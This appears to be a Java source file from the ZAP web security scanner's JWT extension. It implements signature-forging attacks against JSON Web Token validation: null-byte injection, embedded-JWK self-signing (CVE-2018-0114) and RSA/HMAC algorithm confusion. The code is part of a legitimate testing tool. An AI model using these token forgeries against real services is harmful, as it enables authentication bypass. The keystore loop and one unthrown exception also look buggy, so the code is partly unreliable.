/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2019 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.jwt.attacks.fuzzer;

import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.HMAC_256;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JSON_WEB_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_EC_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_HEADER_WITH_ALGO_PLACEHOLDER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_OCTET_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_RSA_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_RSA_PSS_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_TOKEN_PERIOD_CHARACTER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.NULL_BYTE_CHARACTER;

import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.crypto.ECDSASigner;
import com.nimbusds.jose.crypto.Ed25519Signer;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.jwk.Curve;
import com.nimbusds.jose.jwk.ECKey;
import com.nimbusds.jose.jwk.OctetKeyPair;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.jwk.gen.ECKeyGenerator;
import com.nimbusds.jose.jwk.gen.OctetKeyPairGenerator;
import com.nimbusds.jose.jwk.gen.RSAKeyGenerator;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.Key;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.text.ParseException;
import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.json.JSONObject;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.Alert;
import org.zaproxy.zap.extension.jwt.JWTConfiguration;
import org.zaproxy.zap.extension.jwt.JWTTokenBean;
import org.zaproxy.zap.extension.jwt.attacks.ServerSideAttack;
import org.zaproxy.zap.extension.jwt.exception.JWTException;
import org.zaproxy.zap.extension.jwt.utils.JWTUtils;
import org.zaproxy.zap.extension.jwt.utils.VulnerabilityType;

/**
 * This class contains attacks related to manipulation of signature of JWT token.
 *
 * @author preetkaran20@gmail.com KSASAN
 * @since TODO add version
 */
public class SignatureFuzzer implements JWTFuzzer {

    private static final Logger LOGGER = Logger.getLogger(SignatureFuzzer.class);

    private static final String MESSAGE_PREFIX =
            "jwt.scanner.server.vulnerability.signatureFuzzer.";
    private ServerSideAttack serverSideAttack;

    /**
     * Adds Null Byte to the signature to checks if JWT is vulnerable to Null Byte injection. Main
     * gist of attack is say validator is vulnerable to null byte hence if anything is appended
     * after null byte will be ignored.
     *
     * @throws JWTException
     */
    private boolean executeNullByteFuzzTokens() throws JWTException {
        // Appends signature with NullByte plus ZAP eyeCather.
        JWTTokenBean cloneJWTTokenBean = new JWTTokenBean(this.serverSideAttack.getJwtTokenBean());
        if (this.serverSideAttack.getJwtActiveScanner().isStop()) {
            return false;
        }

        if (executeAttack(
                cloneJWTTokenBean.getBase64EncodedToken()
                        + NULL_BYTE_CHARACTER
                        + Constant.getEyeCatcher(),
                serverSideAttack)) {
            raiseAlert(
                    MESSAGE_PREFIX,
                    VulnerabilityType.NULL_BYTE,
                    Alert.RISK_MEDIUM,
                    Alert.CONFIDENCE_HIGH,
                    cloneJWTTokenBean.getBase64EncodedToken(),
                    serverSideAttack);
            return true;
        }

        if (this.serverSideAttack.getJwtActiveScanner().isStop()) {
            return false;
        }

        // Replaces the signature with NullByte.
        cloneJWTTokenBean.setSignature(JWTUtils.getBytes(NULL_BYTE_CHARACTER));
        if (executeAttack(cloneJWTTokenBean.getBase64EncodedToken(), serverSideAttack)) {
            raiseAlert(
                    MESSAGE_PREFIX,
                    VulnerabilityType.NULL_BYTE,
                    Alert.RISK_HIGH,
                    Alert.CONFIDENCE_HIGH,
                    cloneJWTTokenBean.getBase64EncodedToken(),
                    serverSideAttack);
            return true;
        }
        return false;
    }

    private boolean signJWTAndExecuteAttack(
            JWSSigner jwsSigner, JSONObject headerJSONObject, JSONObject payloadJSONObject)
            throws JOSEException, ParseException {
        SignedJWT signedJWT =
                new SignedJWT(
                        JWSHeader.parse(headerJSONObject.toString()),
                        JWTClaimsSet.parse(payloadJSONObject.toString()));
        signedJWT.sign(jwsSigner);
        if (executeAttack(signedJWT.serialize(), serverSideAttack)) {
            raiseAlert(
                    MESSAGE_PREFIX,
                    VulnerabilityType.JWK_CUSTOM_KEY,
                    Alert.RISK_HIGH,
                    Alert.CONFIDENCE_HIGH,
                    signedJWT.serialize(),
                    serverSideAttack);
            return true;
        }
        return false;
    }

    /**
     * Payload is as per the {@link https://nvd.nist.gov/vuln/detail/CVE-2018-0114} vulnerability
     * @throws JWTException
     */
    public boolean executeCustomPrivateKeySignedFuzzToken() throws JWTException {
        JSONObject headerJSONObject =
                new JSONObject(this.serverSideAttack.getJwtTokenBean().getHeader());
        JSONObject payloadJSONObject =
                new JSONObject(this.serverSideAttack.getJwtTokenBean().getPayload());
        String algoType = this.serverSideAttack.getJwtTokenBean().getAlgorithm();

        if (this.serverSideAttack.getJwtActiveScanner().isStop()) {
            return false;
        }
        try {
            if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)
                    || algoType.startsWith(JWT_RSA_PSS_ALGORITHM_IDENTIFIER)) {
                // Generating JWK
                RSAKeyGenerator rsaKeyGenerator = new RSAKeyGenerator(2048);
                rsaKeyGenerator.algorithm(JWSAlgorithm.parse(algoType));
                RSAKey rsaKey = rsaKeyGenerator.generate();

                headerJSONObject.put(JSON_WEB_KEY_HEADER, rsaKey.toPublicJWK().toJSONObject());
                if (signJWTAndExecuteAttack(
                        new RSASSASigner(rsaKey), headerJSONObject, payloadJSONObject)) {
                    return true;
                }
            } else if (algoType.startsWith(JWT_EC_ALGORITHM_IDENTIFIER)
                    || algoType.startsWith(JWT_OCTET_ALGORITHM_IDENTIFIER)) {
                for (Curve curve : Curve.forJWSAlgorithm(JWSAlgorithm.parse(algoType))) {
                    if (curve == null) {
                        continue;
                    }
                    // Generating JWK
                    JWSSigner jwsSigner = null;
                    if (algoType.startsWith(JWT_EC_ALGORITHM_IDENTIFIER)) {
                        ECKeyGenerator ecKeyGenerator = new ECKeyGenerator(curve);
                        ecKeyGenerator.algorithm(JWSAlgorithm.parse(algoType));
                        ECKey ecKey = ecKeyGenerator.generate();
                        headerJSONObject.put(
                                JSON_WEB_KEY_HEADER, ecKey.toPublicJWK().toJSONObject());
                        jwsSigner = new ECDSASigner(ecKey);
                    } else {
                        OctetKeyPairGenerator octetKeyPairGenerator =
                                new OctetKeyPairGenerator(curve);
                        octetKeyPairGenerator.algorithm(JWSAlgorithm.parse(algoType));
                        OctetKeyPair octetKey = octetKeyPairGenerator.generate();
                        headerJSONObject.put(
                                JSON_WEB_KEY_HEADER, octetKey.toPublicJWK().toJSONObject());
                        jwsSigner = new Ed25519Signer(octetKey);
                    }
                    if (this.signJWTAndExecuteAttack(
                            jwsSigner, headerJSONObject, payloadJSONObject)) {
                        return true;
                    }
                }
            }
        } catch (JOSEException | ParseException e) {
            throw new JWTException("Following exception occurred:", e);
        }
        return false;
    }

    /**
     * Background about the attack:<br>
     * Say an application is using RSA to sign JWT now what will be the verification method {@code
     * verify(String jwtToken, byte[] key); }
     *
     * <p>Now if application is using RSA then for verification RSA public key will be used and in
     * case jwttoken is based on HMAC algorithm then verify method will think key as Secret key for
     * HMAC and will try to decrypt it and as public key is known to everyone so anyone can sign the
     * key with public key and HMAC will accept it.
     *
     * @throws JWTException
     */
    private boolean executeAlgoKeyConfusionFuzzedToken() throws JWTException {
        try {
            KeyStore keyStore = KeyStore.getInstance("PKCS12");
            String trustStorePath = JWTConfiguration.getInstance().getTrustStorePath();
            if (StringUtils.isEmpty(trustStorePath)) {
                trustStorePath = System.getProperty("javax.net.ssl.trustStore");
            }
            if (StringUtils.isNotEmpty(trustStorePath)) {
                String algoType = this.serverSideAttack.getJwtTokenBean().getAlgorithm();
                if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
                    String jwtFuzzedHeader =
                            String.format(JWT_HEADER_WITH_ALGO_PLACEHOLDER, HMAC_256);
                    String base64EncodedFuzzedHeaderAndPayload =
                            JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(jwtFuzzedHeader)
                                    + JWT_TOKEN_PERIOD_CHARACTER
                                    + JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(
                                            this.serverSideAttack.getJwtTokenBean().getPayload());
                    char[] password =
                            JWTConfiguration.getInstance().getTrustStorePassword().toCharArray();
                    keyStore.load(new FileInputStream(trustStorePath), password);
                    while (keyStore.aliases().hasMoreElements()) {
                        String alias = keyStore.aliases().nextElement();
                        Certificate certificate = keyStore.getCertificate(alias);
                        Key publicKey = certificate.getPublicKey();
                        JWTTokenBean clonedJWTokenBean =
                                JWTTokenBean.parseJWTToken(
                                        base64EncodedFuzzedHeaderAndPayload
                                                + JWT_TOKEN_PERIOD_CHARACTER
                                                + JWTUtils.getBase64EncodedHMACSignedToken(
                                                        JWTUtils.getBytes(
                                                                base64EncodedFuzzedHeaderAndPayload),
                                                        publicKey.getEncoded(),
                                                        HMAC_256));
                        if (executeAttack(
                                clonedJWTokenBean.getBase64EncodedToken(), serverSideAttack)) {
                            raiseAlert(
                                    MESSAGE_PREFIX,
                                    VulnerabilityType.ALGORITHM_CONFUSION,
                                    Alert.RISK_HIGH,
                                    Alert.CONFIDENCE_HIGH,
                                    clonedJWTokenBean.getBase64EncodedToken(),
                                    serverSideAttack);
                            return true;
                        }
                    }
                }
            }
        } catch (KeyStoreException
                | NoSuchAlgorithmException
                | CertificateException
                | IOException e) {
            new JWTException(
                    "Exception occurred while getting fuzzed token for confusion scenario", e);
        }
        return false;
    }

    @Override
    public boolean fuzzJWTTokens(ServerSideAttack serverSideAttack) {
        this.serverSideAttack = serverSideAttack;
        try {
            return this.executeCustomPrivateKeySignedFuzzToken()
                    || this.executeAlgoKeyConfusionFuzzedToken()
                    || this.executeNullByteFuzzTokens();
        } catch (JWTException e) {
            LOGGER.error("error occurred while getting signed fuzzed tokens", e);
        }
        return false;
    }
}
